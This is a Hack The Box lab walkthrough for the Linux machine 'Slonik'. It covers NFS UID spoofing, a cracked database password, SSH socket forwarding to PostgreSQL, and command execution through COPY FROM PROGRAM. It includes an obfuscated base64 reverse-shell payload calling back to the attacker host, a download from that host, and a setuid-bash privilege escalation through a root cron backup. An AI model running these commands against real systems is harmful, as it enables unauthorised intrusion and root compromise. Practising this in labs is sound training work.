---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - Penelope
  - PostgresSQL
  - NFS
---
# Overview

| Name        | Slonik |
| ----------- | ------ |
| OS          | Linux  |
| Base Points | Medium |
| Status      | Done   |
# Recon
## Nmap

```bash
[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~]
└──╼ [★]$ sudo nmap -sC -sV -p- 10.129.234.160 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 00:16 CST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 19.18% done; ETC: 00:16 (0:00:04 remaining)
NSOCK ERROR [14.4220s] mksock_bind_addr(): Bind to 0.0.0.0:631 failed (IOD #19): Address already in use (98)
Nmap scan report for 10.129.234.160
Host is up (0.0089s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40394/udp   mountd
|   100005  1,2,3      45277/udp6  mountd
|   100005  1,2,3      51821/tcp   mountd
|   100005  1,2,3      55975/tcp6  mountd
|   100021  1,3,4      33819/tcp6  nlockmgr
|   100021  1,3,4      39157/tcp   nlockmgr
|   100021  1,3,4      41544/udp6  nlockmgr
|   100021  1,3,4      55388/udp   nlockmgr
|   100024  1          41959/udp   status
|   100024  1          44761/tcp6  status
|   100024  1          45933/udp6  status
|   100024  1          58659/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34367/tcp open  mountd   1-3 (RPC #100005)
35795/tcp open  mountd   1-3 (RPC #100005)
39157/tcp open  nlockmgr 1-4 (RPC #100021)
51821/tcp open  mountd   1-3 (RPC #100005)
58659/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~]
└──╼ [★]$ showmount -e slonik.vl 
Export list for slonik.vl:
/var/backups *
/home        *

```

The NFS service exposed 2 directories that I can mount.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~]
└──╼ [★]$ mkdir nfs_mount
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~]
└──╼ [★]$ sudo mount -t nfs slonik.vl: ./nfs_mount -o nolock
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~]
└──╼ [★]$ ls nfs_mount/
home  var
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~/nfs_mount]
└──╼ [★]$ tree
.
├── home
│   └── service  [error opening dir]
└── var
    └── backups
        ├── archive-2025-09-22T1247.zip
        ├── archive-2026-01-06T0616.zip
        ├── archive-2026-01-06T0617.zip
        ├── archive-2026-01-06T0618.zip
        ├── archive-2026-01-06T0619.zip
        └── archive-2026-01-06T0620.zip

5 directories, 6 files

```

I can not read the file inside home directory of service user due to the GID and UID not match the UID and GID of “service” user. I will create user and group that match UID and GID of service user and spawn a shell as this user without creating home directory and now I can read all files inside home directory of service user. There are 2 files that caught my interested, first is `.bash_history` and second is `.psql_history`

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~/nfs_mount]
└──╼ [★]$ sudo groupadd -g 1337 svc1337 
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~/nfs_mount]
└──╼ [★]$ sudo useradd -u 1337 -g 1337 -M -s /bin/bash svc1337
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~/nfs_mount]
└──╼ [★]$ sudo -u svc1337 -i
sudo: unable to change directory to /home/svc1337: No such file or directory
       ▄▄▄▄
   ▄▄▀▀    ▀▀▄▄
 ▄▀            ▀▄
 █▀▄▄        ▄▄▀█  █   █   ██   ▄█▀█▄ ▐█ ▄█▌ ▀█▀ █  █ █▀▀ ▐█▀▀▄   ▄██▄   █▄  ▄█
 █   ▀█▄▄▄▄█▀   █  █▄▄▄█  █  █  █   ▀ ▐██▀    █  █▄▄█ █▄▄ ▐█▄▄█ ▐█▀  ▀█▌  ▀██▀
 █      ▐▌      █  █▀▀▀█  ████  █   ▄ ▐██▄    █  █  █ █   ▐█▀▀█ ▐█▄  ▄█▌  ▄██▄
 ▀▄     ▐▌     ▄▀  █   █ ▐█  █▌ ▀█▄█▀ ▐█ ▀█▌  █  █  █ █▄▄ ▐█▄▄▀   ▀██▀   █▀  ▀█
   ▀▀▄▄ ▐▌ ▄▄▀▀
       ▀▀▀▀
 
Welcome to your Parrot Linux desktop!

Internet access is enabled for paid users subject to the following:
1. This instance is not meant to perform real assessments or interact with any live targets.
2. Pentesting any target (with or without consent) outside of HTB labs is prohibited.

Free users are limited to our own targets, and GitHub.

Remember! Do not store any personal or sensitive information in this box!
Its only purpose is to allow you to play in our labs.

Feel free to install any tools you prefer. 
You have a small amount of persistent storage in ~/my_data.
You can also add persistent customizations via ~/my_data/user_init file, which gets executed on startup!

While ~/my_data will persist, we cannot guarantee its availability, nor do we back it up! 
We cannot recover this data if it is lost! Do not store anything critical or sensitive here.

Note that once this instance is terminated, all data not in ~/my_data, including tools you installed, will be lost! 

PS: You have sudo :)
svc1337@htb-mbac43dy1m:/home/at0mxploit/nfs_mount$ 
```

```bash
svc1337@htb-mbac43dy1m:/home/at0mxploit/nfs_mount/home/service$ ls -la
total 40
drwxr-x--- 5 svc1337 svc1337 4096 Sep 22 07:46 .
drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
-rw-r--r-- 1 svc1337 svc1337   90 Sep 22 07:46 .bash_history
-rw-r--r-- 1 svc1337 svc1337  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 svc1337 svc1337 3771 Oct 24  2023 .bashrc
drwx------ 2 svc1337 svc1337 4096 Oct 24  2023 .cache
drwxrwxr-x 3 svc1337 svc1337 4096 Oct 24  2023 .local
-rw-r--r-- 1 svc1337 svc1337  807 Oct 24  2023 .profile
-rw-r--r-- 1 svc1337 svc1337  326 Sep 22 07:46 .psql_history
drwxrwxr-x 2 svc1337 svc1337 4096 Oct 24  2023 .ssh
svc1337@htb-mbac43dy1m:/home/at0mxploit/nfs_mount/home/service$ cat .bash_history 
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
exit
```

The `.bash_history` file reveals the existence of postgres SQL user and service running locally on the machine.

```bash
svc1337@htb-mbac43dy1m:/home/at0mxploit/nfs_mount/home/service$ cat .psql_history
CREATE DATABASE service;
\c service;
CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
select * from users;
\q
```

CrackStation found its match in an instant and look like service is also the password of the service user.

```bash
sshpass -p 'service' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" service@slonik.vl

Connection to slonik.vl closed.

```

I try to connect to SSH with this credential but SSH session terminate right away after successful connection.
# Initial Foothold

I recheck the bash history again I found that I missed something and that is `/var/run/postgresql/.s.PGSQL.5432` which is a Unix domain socket that PostgreSQL creates for local client connections. Instead of talking over TCP, many local Postgres clients (like psql) use this file-based socket: the server listens on that socket filename and a client connects to it to get a Postgres session. That socket only accepts connections from the machine where PostgreSQL is running (or via something that forwards the socket), so I can’t normally reach it from a remote machine over plain SSH unless I forward it.

Luckily for me that I can forward this socket to my machine using SSH.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~/nfs_mount]
└──╼ [★]$ sshpass -p 'service' ssh -f -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" service@slonik.vl
Warning: Permanently added 'slonik.vl' (ED25519) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
```

Now I will use that socket located on my tmp directory to connect to PostgresSQL service.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~/nfs_mount]
└──╼ [★]$ psql -h /tmp -U postgres
psql (15.14 (Debian 15.14-0+deb12u1), server 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
Type "help" for help.

postgres=# 
```

```bash

postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'id';
COPY 1
postgres=# SELECT * FROM cmd_exec;
                               cmd_output                               
------------------------------------------------------------------------
 uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
(1 row)
```

I tried to execute reverse shell connection on port 4444 several times with no hit but as soon as I changed it to port 443 then I got a reverse shell in my penelope listener which mean it has firewall block outbound uncommon port.

```bash
postgres=# DROP TABLE cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTA4LzQ0MyAwPiYxKSAm|base64 -d|bash';SELECT * FROM cmd_exec;
DROP TABLE
CREATE TABLE
COPY 0
 cmd_output
------------
(0 rows)
```

`(bash >& /dev/tcp/10.10.15.108/443 0>&1) &`

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 172.22.19.201 • 172.17.0.1 • 172.18.0.1 • 172.19.0.1 • 10.10.15.108
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from slonik~10.129.234.160-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/at0m/.penelope/sessions/slonik~10.129.234.160-Linux-x86_64/2026_01_06-12_26_38-429.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
postgres@slonik:/var/lib/postgresql/14/main$ cd /var/lib/postgresql
postgres@slonik:/var/lib/postgresql$ cat user.txt
2b5f3f93ef223555f4a5a8b29393fe9d
```
# Privilege Escalation

I remember that there should be a backup script running every minutes as seen in backup share so I execute `pspy64s` to find the location of this script.

```bash
wget http://$OUR_IP/pspy64s  
chmod +x pspy64s  
./pspy64s
```

Now I can see cronjob that run `/usr/bin/backup` every minute and looking at `/bin/sh` also running then this `backup` must be the script and not ELF binary. The script will back up 2 directories, first it will remove all files inside `/opt/backups/current` and use `ps_basebackup` to take a base backup of a running PostgreSQL database to `/opt/backups/current` directory and will also zip file in that directory in zip file to `/var/backups`. I check the base PostgresSQL database location and `/opt/backups/current` which confirms that all files in this directory will be backup to `/opt/backups/current` and I can write any file to this location.

```bash
postgres@slonik:/var/lib/postgresql/14/main$ cat /usr/bin/backup
#!/bin/bash

date=$(/usr/bin/date +"%FT%H%M")
/usr/bin/rm -rf /opt/backups/current/*
/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
/usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/

count=$(/usr/bin/find "/var/backups/" -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)
if [ "$count" -gt 10 ]; then
  /usr/bin/rm -rf /var/backups/*
fi
```

I will copy the bash binary to database directory and give world and SETUID permission over this binary and after it moving move to `/opt/backups/current`, the owerner will be change to root and thats how I will root the box.

```bash
postgres@slonik:/var/lib/postgresql/14/main$ cp /bin/bash .
postgres@slonik:/var/lib/postgresql/14/main$ chmod 777 bash
postgres@slonik:/var/lib/postgresql/14/main$ chmod u+s bash
postgres@slonik:/var/lib/postgresql/14/main$ ls
PG_VERSION  global        pg_logical    pg_replslot   pg_stat      pg_tblspc    pg_xact               postmaster.pid
base        pg_commit_ts  pg_multixact  pg_serial     pg_stat_tmp  pg_twophase  postgresql.auto.conf
bash        pg_dynshmem   pg_notify     pg_snapshots  pg_subtrans  pg_wal       postmaster.opts
postgres@slonik:/var/lib/postgresql/14/main$ ls -la
total 1456
drwx------ 19 postgres postgres    4096 Jan  6 06:44 .
drwxr-xr-x  3 postgres postgres    4096 Oct 23  2023 ..
-rw-------  1 postgres postgres       3 Oct 23  2023 PG_VERSION
drwx------  7 postgres postgres    4096 Oct 24  2023 base
-rwsrwxrwx  1 postgres postgres 1396520 Jan  6 06:44 bash
drwx------  2 postgres postgres    4096 Jan  6 06:14 global
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_commit_ts
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_dynshmem
drwx------  4 postgres postgres    4096 Jan  6 06:44 pg_logical
drwx------  4 postgres postgres    4096 Oct 23  2023 pg_multixact
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_notify
drwx------  2 postgres postgres    4096 Jan  6 06:44 pg_replslot
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_serial
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_snapshots
drwx------  2 postgres postgres    4096 Jan  6 06:13 pg_stat
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_stat_tmp
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_subtrans
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_tblspc
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_twophase
drwx------  3 postgres postgres    4096 Jan  6 06:44 pg_wal
drwx------  2 postgres postgres    4096 Oct 23  2023 pg_xact
-rw-------  1 postgres postgres      88 Oct 23  2023 postgresql.auto.conf
-rw-------  1 postgres postgres     130 Jan  6 06:13 postmaster.opts
-rw-------  1 postgres postgres      98 Jan  6 06:13 postmaster.pid
```

Wait for a minute to let the backup script run and now I have SETID bash own by root! When a binary file has the setuid bit set, the kernel sets the process’s effective UID to the file’s owner at_ `_exec()_` time. So if you change the file’s owner to root and the file has the setuid bit, running that binary will run with EUID root.

```bash
postgres@slonik:/var/lib/postgresql/14/main$ ls -lah /opt/backups/current/
total 1.6M
drwxr-xr-x 19 root root 4.0K Jan  6 06:48 .
drwxr-xr-x  3 root root 4.0K Oct 23  2023 ..
-rw-------  1 root root    3 Jan  6 06:48 PG_VERSION
-rw-------  1 root root  227 Jan  6 06:48 backup_label
-rw-------  1 root root 177K Jan  6 06:48 backup_manifest
drwx------  6 root root 4.0K Jan  6 06:48 base
-rwsrwxrwx  1 root root 1.4M Jan  6 06:48 bash
drwx------  2 root root 4.0K Jan  6 06:48 global
drwx------  2 root root 4.0K Jan  6 06:48 pg_commit_ts
drwx------  2 root root 4.0K Jan  6 06:48 pg_dynshmem
drwx------  4 root root 4.0K Jan  6 06:48 pg_logical
drwx------  4 root root 4.0K Jan  6 06:48 pg_multixact
drwx------  2 root root 4.0K Jan  6 06:48 pg_notify
drwx------  2 root root 4.0K Jan  6 06:48 pg_replslot
drwx------  2 root root 4.0K Jan  6 06:48 pg_serial
drwx------  2 root root 4.0K Jan  6 06:48 pg_snapshots
drwx------  2 root root 4.0K Jan  6 06:48 pg_stat
drwx------  2 root root 4.0K Jan  6 06:48 pg_stat_tmp
drwx------  2 root root 4.0K Jan  6 06:48 pg_subtrans
drwx------  2 root root 4.0K Jan  6 06:48 pg_tblspc
drwx------  2 root root 4.0K Jan  6 06:48 pg_twophase
drwx------  3 root root 4.0K Jan  6 06:48 pg_wal
drwx------  2 root root 4.0K Jan  6 06:48 pg_xact
-rw-------  1 root root   88 Jan  6 06:48 postgresql.auto.conf
```

```bash
postgres@slonik:/var/lib/postgresql/14/main$ /opt/backups/current/bash -p
bash-5.1# cat /root/root.txt
2cb582cd567bfd996cdb742eb1d544de
```

---